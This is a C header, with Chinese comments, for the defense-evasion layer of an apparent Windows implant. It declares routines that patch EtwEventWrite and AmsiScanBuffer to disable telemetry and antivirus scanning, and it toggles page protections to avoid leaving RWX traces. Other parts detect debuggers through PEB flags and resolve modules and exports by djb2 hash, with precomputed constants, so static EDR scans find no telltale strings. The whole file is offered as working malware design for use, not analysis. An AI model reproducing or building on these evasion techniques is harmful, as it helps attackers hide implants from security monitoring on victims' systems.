/*
 * agent_windows/include/defend_win.h
 *
 * Windows 对抗检测集成层（G3）。
 *
 * 与仓库已有模块的分工（本层不重复实现任何一层）：
 *   导出表解析 —— 复用 17_loader 的 pe_export_by_name()
 *   桩字节写入 —— 复用 19_defense 的 df_evade_etw() / df_evade_amsi()
 *   采集编排   —— 交给 agent_windows/implant.c 的 defend 钩子
 * 本层只负责 Windows 专属的三件事：
 *   1. 拿到模块基址（不走 GetModuleHandle / GetProcAddress，二者常被 hook）
 *   2. 切换目标页的可写性并恢复（ntdll 真机是 RX，硬写必崩）
 *   3. 把上述两步与打桩编排成一个可直接当 implant defend 回调的入口
 *
 * 平台专属能力全部走回调注入，因此本文件是纯 C99、不含任何 Windows API，
 * 可在 Linux 下真编译、真测试；Windows 真机只需填回调实现。
 *
 * 四条硬规则（违反任一都会造成"看起来跑通、实际失败或暴露"）：
 *   1. 保护切换失败必须拒绝打桩。否则对 RX 页硬写 -> 访问违例，进程当场死。
 *      这不是"补丁没打上"，是"把自己打死"。
 *   2. 打桩后必须恢复原保护。残留 RWX 页本身就是 EDR 的强特征，
 *      比不修补更招惹检查。
 *   3. 模块未加载 ≠ 打桩失败。amsi.dll 未载入时 AmsiScanBuffer 无从修补，
 *      此时是"无需修补"，返回 OK；把 NOTFOUND 当失败会让植入体在
 *      干净的机器上拒绝运行。
 *   4. 解析不到导出不得静默跳过。EtwEventWrite 是必打项，
 *      找不到必须报错，否则植入体在带遥测的机器上裸奔。
 */
#ifndef DAYANJING_AGENT_WINDOWS_DEFEND_WIN_H
#define DAYANJING_AGENT_WINDOWS_DEFEND_WIN_H

#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

/* ====================================================================
 * 返回码
 * ==================================================================== */
#define DW_OK             0
#define DW_ERR_ARG       -1   /* 参数非法 */
#define DW_ERR_NOMODULE  -2   /* 模块未加载（对可选项意味着"无需修补"） */
#define DW_ERR_NOEXPORT  -3   /* 模块在，但导出表里没有该函数 */
#define DW_ERR_PROTECT   -4   /* 内存保护切换失败 */
#define DW_ERR_PATCH     -5   /* 打桩写入失败（越界等） */
#define DW_ERR_UNSAFE    -6   /* 反调试/反沙箱判定环境不安全 */

/* 页保护（与真机语义对应，避免直接引入 Windows 头） */
#define DW_PROT_NONE  0
#define DW_PROT_R     1
#define DW_PROT_RW    2
#define DW_PROT_RX    3
#define DW_PROT_RWX   4

/* 桩长度：与 19_defense 的 DF_ETW_PATCH_LEN / DF_AMSI_PATCH_LEN 一致 */
#define DW_ETW_STUB_LEN   3u
#define DW_AMSI_STUB_LEN  6u

/* 打桩时按此长度做越界检查。函数体远长于此，取 16 安全且不吃掉后续指令。 */
#define DW_PATCH_WINDOW  16u

/* ====================================================================
 * 平台回调
 * ==================================================================== */

/*
 * 模块基址：按模块名（如 "ntdll.dll"）返回其在内存中的映像基址与大小。
 * Windows 实现走 PEB->Ldr 双向链表遍历；测试注入假映像。
 * 返回 DW_OK / DW_ERR_NOMODULE。
 */
typedef int (*dw_module_fn)(const char *name, void *ud,
                            uint8_t **out_base, size_t *out_size);

/*
 * 页保护切换：把 [addr, addr+len) 改为 prot。
 * 成功返回 DW_OK 并通过 *out_old 回填原保护值（用于恢复）。
 */
/*
 * 按【模块名哈希】取模块。产品实现（PEB->Ldr 遍历）应提供这一条，
 * 使 "ntdll.dll" / "amsi.dll" 也不以明文出现在制品里。
 * 提供它时 dw_defend_all 走全哈希路径，完全无明文符号。
 */
typedef int (*dw_module_h_fn)(uint32_t name_hash, void *ud,
                              uint8_t **out_base, size_t *out_size);

typedef int (*dw_protect_fn)(void *addr, size_t len, int prot,
                             void *ud, int *out_old);

/*
 * PEB 读取：把 PEB 起始处至少 len 字节拷入 buf。
 * Windows 实现读 __readgsqword(0x60)；测试注入构造的字节。
 */
typedef int (*dw_peb_fn)(uint8_t *buf, size_t len, void *ud);

/* ====================================================================
 * 反调试（PEB 标志，不调用 IsDebuggerPresent 一类可被 hook 的 API）
 * ==================================================================== */
typedef struct {
    int      valid;          /* 1 = 解析成功；0 = 缓冲不足/结构不符 */
    uint8_t  being_debugged; /* PEB+2 */
    uint32_t nt_global_flag; /* PEB+0xBC (x64) */
    uint32_t heap_flags;     /* ProcessHeap->Flags */
    uint32_t force_flags;    /* ProcessHeap->ForceFlags */
    int      verdict;        /* 0 = 干净，非 0 = 可疑 */
} dw_debug_info_t;

#define DW_PEB_MIN_LEN  0xC8u  /* 至少覆盖到 NtGlobalFlag(x64: +0xBC) */

/*
 * 解析 PEB 调试标志。peb 为 PEB 起始字节，heap 可选（传 NULL 则跳过堆标志）。
 * 判定规则：任一已知标志置位即判可疑。
 */
int dw_debug_peb(const uint8_t *peb, size_t peb_len,
                 const uint8_t *heap, size_t heap_len,
                 dw_debug_info_t *out);

/* ====================================================================
 * 上下文与打桩
 * ==================================================================== */
/*
 * 取模块的方式。必须是【显式枚举】而不是"看哪个回调指针非空"：
 * 后者之下，调用方一旦漏做 memset，mod_h_fn 就是栈上的野值，会被当成
 * 有效回调直接调用 —— 表现为随机崩溃（取决于栈残留），且崩溃点位于
 * 与本次调用完全无关的位置，是本层最难排查的一类故障。
 * 改成枚举后，漏清零时 mode = 0，安全回落按名路径，不会野跳转。
 */
typedef enum {
    DW_MOD_BY_NAME = 0,   /* 默认：按模块名走 mod_fn（清零后的值，安全） */
    DW_MOD_BY_HASH        /* 按模块名哈希走 mod_h_fn，二进制内无明文 */
} dw_mod_mode_t;

typedef struct {
    dw_mod_mode_t  mode;    /* 显式指定；memset 后为 BY_NAME，即安全默认 */
    dw_module_fn   mod_fn;
    dw_module_h_fn mod_h_fn;
    dw_protect_fn  prot_fn;
    dw_peb_fn      peb_fn;  /* 可为 NULL：跳过反调试 */
    void          *ud;
} dw_ctx_t;

typedef enum {
    DW_T_ETW = 0,
    DW_T_AMSI
} dw_target_t;

typedef struct {
    dw_target_t target;
    int         rc;         /* DW_OK / 具体错误 */
    uint8_t    *addr;       /* 打桩地址，失败则为 NULL */
    int         old_prot;   /* 原保护值 */
    int         restored;   /* 1 = 保护已恢复 */
} dw_patch_result_t;

/*
 * 解析模块导出（不走 GetProcAddress）。
 * mod_base 指向 PE 头（'MZ'），mod_size 为映像大小。
 * 成功返回 DW_OK 并写出 base + rva。
 */
int dw_resolve_export(const uint8_t *mod_base, size_t mod_size,
                      const char *func, uint8_t **out_addr);

/* ---- 按【名字哈希】解析：函数名不以明文出现在二进制里 ----
 *
 * 为什么必须有这条路径：按名解析会把 "EtwEventWrite" / "AmsiScanBuffer"
 * 以明文写进制品，EDR 只需 strings 一遍即可判定这是 ETW/AMSI 绕过工具。
 * 哈希路径下二进制里只有 4 字节常量，静态扫描无从得知目标是谁。
 *
 * 哈希算法 djb2（与 dw_hash_name 一致）。
 */
#define DW_HASH_ETW_EVENT_WRITE   0x24a8d022u  /* "EtwEventWrite"  */
#define DW_HASH_AMSI_SCAN_BUFFER  0x29fcd18eu  /* "AmsiScanBuffer" */
#define DW_HASH_NTDLL             0x22d3b5edu  /* "ntdll.dll"      */
#define DW_HASH_AMSI_DLL          0xdaf90fd9u  /* "amsi.dll"       */

/*
 * 产品构建建议加 -DDW_NO_PLAINNAME：
 * 剔除全部明文模块名分支，二进制中不再出现 "ntdll.dll"/"amsi.dll"。
 * 此时必须提供 mod_h_fn，否则 dw_defend_all 返回 ARG。
 */

uint32_t dw_hash_name(const char *s);
int dw_resolve_export_h(const uint8_t *mod_base, size_t mod_size,
                        uint32_t name_hash, uint8_t **out_addr);

/* 按哈希打桩。产品路径走这一条（dw_defend_all 内部即使用它）。 */
int dw_patch_symbol_h(const dw_ctx_t *ctx, const char *mod, uint32_t func_hash,
                      dw_target_t target, dw_patch_result_t *out);

/*
 * 对单个符号完成：解析 -> 改 RWX -> 打桩 -> 恢复原保护。
 *
 * 关键：无论打桩成败，只要保护切换成功就一定尝试恢复；
 * 恢复失败也一并视为失败（残留可写可执行页不可接受）。
 */
int dw_patch_symbol(const dw_ctx_t *ctx, const char *mod, const char *func,
                    dw_target_t target, dw_patch_result_t *out);

/* ====================================================================
 * 编排
 * ==================================================================== */
typedef struct {
    dw_patch_result_t etw;
    dw_patch_result_t amsi;
    dw_debug_info_t   dbg;
    int               amsi_absent;  /* 1 = amsi.dll 未加载（视为无需修补） */
} dw_report_t;

/*
 * 完整对抗流程：反调试 -> ETW 修补 -> AMSI 修补。
 * 返回 DW_OK 表示环境安全且必打项已打；可直接作为 implant 的 defend 回调
 * （0 = 安全，非 0 = 拒绝运行）。
 *
 * 必打/可选：
 *   ETW  —— 必打。解析失败即返回错误。
 *   AMSI —— 可选。模块未加载记为 amsi_absent=1 且不算失败。
 */
int dw_defend_all(const dw_ctx_t *ctx, dw_report_t *rep);

const char *dw_errstr(int e);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_AGENT_WINDOWS_DEFEND_WIN_H */
